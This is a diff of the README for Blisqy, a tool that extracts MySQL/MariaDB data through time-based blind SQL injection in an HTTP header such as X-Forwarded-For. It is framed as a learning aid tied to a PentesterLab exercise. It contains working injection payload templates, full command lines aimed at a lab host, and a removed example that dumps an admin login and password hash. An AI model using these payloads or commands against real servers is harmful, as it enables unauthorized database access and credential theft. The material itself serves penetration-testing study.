@@ -1,13 +1,11 @@
 # Blisqy
 A slow data siphon for MySQL/MariaDB using bitwise operation on printable ASCII characters, via a blind-SQL injection.
 
-**PS:** Just another way to learn and understand SQL injections - how to manually hunt them down. What happens under the hood of SQLi tools.
-
 ## Usage
 ```bash
 USAGE:
 blisqy.py --server <Web Server> --port <port> --header <vulnerable header> --hvalue <header value> 
-          --inject <point of injection>  --payload <custom sql payload> --dig <yes/no>
+          --inject <point of injection>  --payload <custom sql payload> --dig <yes/no> --sleeptime <default 0.5>
 
 Options:
   -h, --help            show this help message and exit
@@ -18,118 +16,79 @@ Options:
   --inject=INJECTION    Provide where to inject Sqli payload
   --payload=PAYLOAD     Provide SQL statment/query to inject as payload
   --dig=DIGGER          Automatic Mysql-Schema enumeration (takes time!)
-  --sleeptime=SLEEP     Sleep-Time for blind-SQLi query (default : 0.9)
+  --sleeptime=SLEEP     Sleep-Time for blind-SQLi query (default : 0.5)
+  --interactive=INTERACT
+                        Turn interactive mode on/off (default : off)
 ```
+
+
+# Basics
+
+Blisqy will assit you enumerate a MySQL/Maria DB after finding a Time-Based Blind Sql injection vulnerability on a web server. Currently, it supports injections on HTTP Headers. You should have identified a potential Blind Sql injection vulnerability on a Webserver as demonstrated on [Pentester-Lab (From SQL Injection to Shell II)](https://pentesterlab.com/exercises/from_sqli_to_shell_II/course)
+
+So you can't run Blisqy without :
+
+* `--server` : the vulnerable Webserver
+* `--port`  : Which port is the webserver running on?
+* `--header` : the identified vulnerable HTTP header
+* `--hvalue` : value for the identified vulnerable HTTP header
+
+and most imporntatly `--inject` : what to inject after the `hvalue` (SQLi Payload).
+
+
+
+# Options :
+
+## --inject
+
+After identifying a Time-Based BlindSQL injection on a web-server, this option enables the user craft and insert SQL-injection payloads. The value for this option should look like this :
+
+`--inject "' or if((*sql*),sleep(*time*),0) and '1'='1"`
+
+Where 
+* `*sql*` - is where SQL Payloads will be inserted and 
+* `*time*` - is where Time-Based test will be inserted.
+
+## --sleeptime 
+Blisqy now accepts user set --sleeptime and it's inserted on `--inject *time*`. Always make sure you have fine tuned this value to resonates with your environment and network lantency.... Otherwise you'll be toased! (the lower the value, the faster we go).
+E.g. 
+`--sleeeptime 0.1`
+
+## --payload
+This option allows the user run their own custom SQL-injection payloads. Other options like `--dig` and `--interactive` **MUST** not be set (should be ignored) for this option to run.
+
+### Example :
+
+**Command**
+
+```bash
+./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" 
+           --sleeptime 0.1 --interactive on 
+           --inject "' or if((*sql*),sleep(*time*),0) and '1'='1" 
+           --payload "select @@hostname"
+```
+![Custom Payload](http://i.imgur.com/uB3s7Xk.png)
+
+
+## --interactive
+
+This option accept two values i.e on or off and it compliments option `--dig` (this option must be set to `yes`). If set as `--interactive on` the user will get to choose which discovered table to enumerate and decide if data from the table should be dumped or not. When set as "--interactive off", every table gets enumerated and all data dumped.
+
+### Getting data from a Table :
+The user can decide which columns to extract data from when `--interactive` is set on. The format looks something like this : 
+`column1*column1*column2` - just the column names separated by an asterisk. User can also avoid data collection on a particular table by entering `skip` instead of the column names.
+
+### Example :
+
+**Command**
+
+```bash
+./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes 
+            --sleeptime 0.1 --interactive on --inject "' or if((*sql*),sleep(*time*),0) and '1'='1"
+```
+![Dig A Specific Table](http://i.imgur.com/HNj8Dwx.png)
+
+
 ## To Do :
 * Intergrate an inteligent Fuzzer for hunting SQL injection vulnerabrity(ies) on HTTP Headers and Web Elements
 * Support Blind-SQLi enumeration of URLs and WEB Elements apart from HTTP Headers.
-
-
-## Assumptions :
-
-At the moment, Blisqy assumes you have identified a potential Blind Sql injection vulnerability on a Webserver as demonstrated on [Pentester-Lab (From SQL Injection to Shell II)](https://pentesterlab.com/exercises/from_sqli_to_shell_II/course)
-
-```bash
-So point of injection BY DEFAULT is ---> 'or if((%s),sleep(0.9),0) and '1'='1
-
-In other words, this argument is set.
---inject <point of injection> 
-```
-
-## Example :
-**Vulnerable header is "X-Forwarded-For" and using --dig will enumerate the MySQL DB but takes time**
-
-```bash
-./blisqy.py --server 192.168.56.101 --port 80 --header "X-Forwarded-For" --hvalue "hacker" --dig yes --sleeptime 0.9
-[+] Getting Current Database : 
-[-] photoblog
-
-
-[+] Getting  number of TABLES from schema
-[-] 4
-
-
-[+] Getting  all TABLE NAMES from Schema
-[-] categories
-[-] pictures
-[-] stats
-[-] users
-
-
-[+] Getting Columns and Rows from Schema
-Preparing to get  all Columns in Table : categories
-=====================================================
-
-
-[+] Getting   Number of Columns in a categories .
-[-] 2
-[+] Getting  all Column Names in Table : categories .
-id
-title
-Number of Rows on Table : categories 
-3
-Preparing to get  all Columns in Table : pictures 
-=====================================================
-
-
-[+] Getting Number of Columns in Table : pictures
-[-] 4
-[+] Getting  all Column Names in Table : pictures
-cat
-id
-img
-title
-Number of Rows on Table : pictures 
-3
-Preparing to get  all Columns in Table : stats
-=====================================================
-
-
-[+] Getting   Number of Columns in a stats .
-[-] 2
-[+] Getting  all Column Names in Table : stats .
-count
-ip
-Number of Rows on Table : stats 
-1
-Preparing to get  all Columns in Table : users .
-=====================================================
-
-
-[+] Getting   Number of Columns in a users
-[-] 3
-[+] Getting  all Column Names in Table : users .
-id
-login
-password
-Number of Rows on Table : users 
-1
-
-```
-**With the above knowledge craft a niffty custom payload**
-```bash
-./blisqy.py --server 192.168.56.101 --port 80 --header X-Forwarded-For --hvalue "lol"  
-            --payload "select concat(id,':',login,':',password) from users order by id desc limit 1"  
-            --sleeptime 0.9
-
-Extracting Data from ====> 192.168.56.101 : 80 
-Current Payload : select concat(id,':',login,':',password) from users order by id desc limit 1
-==================================================================
-
-1:admin:8efe310f9ab3efeae8d410a8e0166eb2
-```
-
-**Vulnerable header is "X-Forwarded-For" and using --payload will run a custom SQL query on the MySQL DB**
-```bash
-./blisqy.py --server 192.168.56.101 --port 80 --header X-Forwarded-For --hvalue "lol"  
-            --payload "select @@hostname" --sleeptime 0.8
-
-Extracting Data from ====> 192.168.56.101 : 80 
-Current Payload : select @@hostname
-==================================================================
-debian
-```
-
-## Very Imporntant
-Always make sure you have fine tuned the `--sleeptime` to a value that resonates with your environment and network lantency.... Otherwise you'll be toased!
-
